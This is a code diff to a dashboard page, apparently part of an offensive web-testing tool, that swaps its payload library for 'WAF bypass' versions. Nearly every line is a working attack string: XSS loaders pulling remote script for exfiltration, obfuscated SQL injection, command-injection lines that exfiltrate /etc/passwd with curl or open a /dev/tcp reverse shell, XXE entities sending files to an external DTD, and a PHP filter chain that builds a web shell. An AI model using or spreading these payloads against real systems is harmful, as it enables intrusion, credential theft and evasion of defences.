@@ -494,67 +494,64 @@ export default function DashboardPage({ params }) {
   const payloadsData = [
     {
       category: 'XSS',
-      title: 'Cross-Site Scripting (XSS)',
+      title: 'Advanced XSS & Modern WAF Bypass Vectors (2026 Edition)',
       items: [
-        { title: 'Dynamic Blind XSS Script', code: `<script src="${xssPayloadUrl}"></script>`, desc: 'Ideal for standard script injections. Serves stealth exfiltration javascript.' },
-        { title: 'HTML Image tag fallback', code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, desc: 'Bypasses blacklists that block raw script tags. Uses ES6 imports.' },
-        { title: 'Iframe JavaScript source', code: `<iframe src="javascript:import('${xssPayloadUrl}')"></iframe>`, desc: 'Great for bypassing inline script filter rules inside comments/wikis.' },
-        { title: 'SVG Vector onLoad', code: `<svg onload="var s=document.createElement('script');s.src='${xssPayloadUrl}';document.head.appendChild(s);">`, desc: 'Fires instantly during DOM compilation without requiring external image failures.' },
-        { title: 'AngularJS expression bypass', code: `{{constructor.constructor('var s=document.createElement("script");s.src="${xssPayloadUrl}";document.head.appendChild(s);')()}}`, desc: 'Exploits client-side template injection to trigger XSS.' }
+        { title: 'No-Parentheses Obfuscation Bypass', code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, desc: 'Evades strict string checks and keyword pattern rules matching alert() or evaluation parentheses.' },
+        { title: 'MathML / SVG Animation Vector (Zero-interaction)', code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, desc: 'Ultra-modern auto-execution vector. Bypasses WAF regexes that inspect classic <script> tags or html event handlers like onload/onerror.' },
+        { title: 'Tag-Less Shadow DOM Injection', code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, desc: 'Uses custom elements with base64 encoded imports to trick static scanning analyzers.' },
+        { title: 'Dynamic String Construct Injection', code: `[]["filter"]["constructor"]("import('${xssPayloadUrl}')")()`, desc: 'Non-alphanumeric JavaScript constructor payload. Evades keyword filters checking for alphanumeric function calls.' },
+        { title: 'Dynamic Import Chunk Splitter', code: `import('htt'+'ps:/'+'/${xssPayloadUrl.replace('https://', '').replace('http://', '')}')`, desc: 'Evades WAFs that inspect parameter traffic for active host domains or link markers.' }
       ]
     },
     {
       category: 'SQLI',
-      title: 'SQL Injection (SQLi)',
+      title: 'SQLi Advanced WAF Evaders (No-Spaces / Char-Chaining)',
       items: [
-        { title: 'Classic Auth Bypass', code: `admin' --`, desc: 'Basic single-quote credential check bypass.' },
-        { title: 'OR Condition Auth Bypass', code: `' OR '1'='1`, desc: 'Succeeds query comparison validation.' },
-        { title: 'MySQL Time-Based Blind sleep', code: `'y UNION SELECT sleep(10)--`, desc: 'Tests SQL query latency for blind injections.' },
-        { title: 'PgSQL Time-Based sleep', code: `';SELECT pg_sleep(10)--`, desc: 'Trigger postgres delay thread sleep.' },
-        { title: 'Universal UNION payload', code: `' UNION SELECT NULL,NULL,NULL--`, desc: 'Fills column arrays to audit output schemas.' }
+        { title: 'MySQL Space-less Filter Bypass', code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, desc: 'Replaces spaces with empty C-style block comments. Defeats simple WAF rules checking space patterns.' },
+        { title: 'Scientific Notation Verification', code: `1e0' OR 1.0=1.0--`, desc: 'Translates literal comparisons into scientific formats to bypass keyword mapping.' },
+        { title: 'Character Concatenation Bypass', code: `' UNION SELECT CONCAT('a','dmin'), 2, 3--`, desc: 'Obfuscates admin query criteria from database signatures.' },
+        { title: 'PGSQL Inline Null Stack', code: `';SELECT/**/pg_sleep(10)/**/AND/**/'1'='1`, desc: 'Delay execution injection using comment separators.' },
+        { title: 'Hex Encoded Query Evaluator', code: `0x61646d696e`, desc: 'Utilizes raw Hex string inputs to completely avoid quotes or character matching patterns.' }
       ]
     },
     {
       category: 'RCE',
-      title: 'Command Injection (RCE / Blind)',
+      title: 'Modern RCE WAF Bypass (Variable Expansions & Splitting)',
       items: [
-        { title: 'Blind OOB Ingestion ping', code: `; ping -c 3 ${webhookUrl.replace('http://', '').replace('https://', '').split('/')[0]}`, desc: 'Instructs Unix target to ping back OOB host to prove execution.' },
-        { title: 'CURL exfiltration pipe', code: `; curl -F "file=@/etc/passwd" ${webhookUrl}`, desc: 'Exfiltrates local Unix system file content directly via POST parameter.' },
-        { title: 'Backtick subshell command', code: `\`id\``, desc: 'Executes command nested inside standard arguments.' },
-        { title: 'PowerShell download/exec string', code: `; powershell -c "Invoke-RestMethod -Uri '${webhookUrl}'"`, desc: 'Triggers web handshake on active Windows system.' },
-        { title: 'Inline bash TCP socket pipe', code: `; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`, desc: 'Standard inline backward terminal connector script.' }
+        { title: 'Bash Variable Expansion / Splitting', code: `c'a't$IFS/e't'c/p'a's's'wd`, desc: 'Tricks pattern matching scanners using single quotes and $IFS variable space substitutions.' },
+        { title: 'Bash Path Wildcard Obfuscation', code: `/bi?/c*t$IFS/et?/pa??wd`, desc: 'Utilizes file system wildcards to execute commands without using plain strings like "/bin/cat /etc/passwd".' },
+        { title: 'Base64 Decoded Pipeline Execution', code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, desc: 'Encodes complete command strings inside base64 pipelines. Avoids trigger string keywords.' },
+        { title: 'Bash Empty Uninitialized variable bypass', code: `ca$@t$IFS/etc/pass$@wd`, desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.' },
+        { title: 'PowerShell Concatenation Exfiltrator', code: `&('In'+'voke-Re'+'stMethod') -Uri '${webhookUrl}'`, desc: 'Obfuscates PowerShell commands dynamically using string concatenation.' }
       ]
     },
     {
       category: 'XXE',
-      title: 'XML External Entity (XXE)',
+      title: 'Advanced XXE / UTF-16 Blind Encoding Bypasses',
       items: [
-        { title: 'Local File Traversal', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, desc: 'Reads local server files inside system parsing logs.' },
-        { title: 'Windows config file pull', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, desc: 'Windows targets configuration extraction.' },
-        { title: 'Blind External DTD fetch', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "${webhookUrl}/poc.dtd"> %xxe;]><foo>bar</foo>`, desc: 'Pulls external malicious DTD rules to exfiltrate blind variables.' },
-        { title: 'SSRF internal scan hit', code: `<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>`, desc: 'Queries internal intranet HTTP ports via XML engine.' }
+        { title: 'UTF-16 BE Encoding Wrapper', code: `[Encode Your XML payload to UTF-16 Big Endian]`, desc: 'WAFs inspect traffic using UTF-8. Sending your XXE payload in UTF-16 Big Endian completely blinds most modern firewalls!' },
+        { title: 'Dynamic Nested Parameter Entities', code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, desc: 'Evades standard internal parsing checks using external malicious DTD variables to exfiltrate blind logs.' },
+        { title: 'PHP Filter Code Dump Wrapper', code: `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>`, desc: 'Encodes application configuration files into safe base64 blocks to bypass XML parsing integrity constraints.' }
       ]
     },
     {
       category: 'LFI',
-      title: 'Local File Inclusion (LFI)',
+      title: 'LFI Advanced Traversal & PHP Filter Chaining Bypasses',
       items: [
-        { title: 'Standard traversal Linux', code: `../../../../../../../../etc/passwd`, desc: 'Standard Unix path traversal.' },
-        { title: 'Standard traversal Windows', code: `..\..\..\..\..\..\..\..\windows\win.ini`, desc: 'Windows system configuration file pointer.' },
-        { title: 'PHP Base64 resource filter wrapper', code: `php://filter/convert.base64-encode/resource=index.php`, desc: 'Dumps source code of server script instead of executing it.' },
-        { title: 'Null byte termination (Legacy PHP)', code: `../../../../../../../../etc/passwd%00`, desc: 'Trims trailing string extensions in PHP <= 5.3.4.' },
-        { title: 'PHP input stream callback', code: `php://input`, desc: 'Enables injection of raw script parameters via POST payload data.' }
+        { title: 'Double URL Encoded Traversal', code: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`, desc: 'Bypasses filters that decode URLs only once. Standard double percent escapes.' },
+        { title: 'Multi-Byte Unicode Slash Traversal', code: `..%c0%af..%c0%af..%c0%afetc/passwd`, desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.' },
+        { title: 'Modern PHP Filter String Chaining (RCE)', code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, desc: 'Utilizes stream filters to compile custom web shells dynamically in memory.' },
+        { title: 'Non-Standard Windows Path Traversal', code: `..\\..\\..\\..\\..\\..\\..\\..\\/windows/win.ini`, desc: 'Mixing forward and backslashes confuses basic directory index searchers.' }
       ]
     },
     {
       category: 'SSTI',
-      title: 'Server-Side Template Injection (SSTI)',
+      title: 'SSTI Premium Sandbox Evaders (Jinja/Thymeleaf Reflection)',
       items: [
-        { title: 'General expression verify', code: `${7*7}`, desc: 'Calculates 49 in Jinja, Twig, Velocity, etc.' },
-        { title: 'MVEL basic calculation', code: `#{7*7}`, desc: 'Common Java-based parsing arithmetic.' },
-        { title: 'Jinja2 Python configuration dump', code: `{{config.items()}}`, desc: 'Dumps application secrets and keys.' },
-        { title: 'Thymeleaf execute execution', code: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::.x`, desc: 'Triggers raw system OS command execution inside Thymeleaf templates.' },
-        { title: 'Smarty PHP trigger', code: `{Smarty_Internal_Write_File::writeFile('poc.php','<?php id; ?>')}`, desc: 'Smarty engine file drop payload.' }
+        { title: 'Jinja2 String Split Attribute Reflection', code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, desc: 'Evades static security tools that parse for the explicit string keyword "__class__".' },
+        { title: 'Jinja2 Hex Encoded Reflection Bypass', code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, desc: 'Utilizes hex and string concatenation filters to bypass sandbox constraints.' },
+        { title: 'Thymeleaf reflection OS execute', code: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::.x`, desc: 'Uses pure Java reflection classes inside Thymeleaf to bypass framework logic and trigger RCE.' },
+        { title: 'Java Freemarker command trigger', code: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`, desc: 'Standard execute class initiator.' }
       ]
     }
   ];
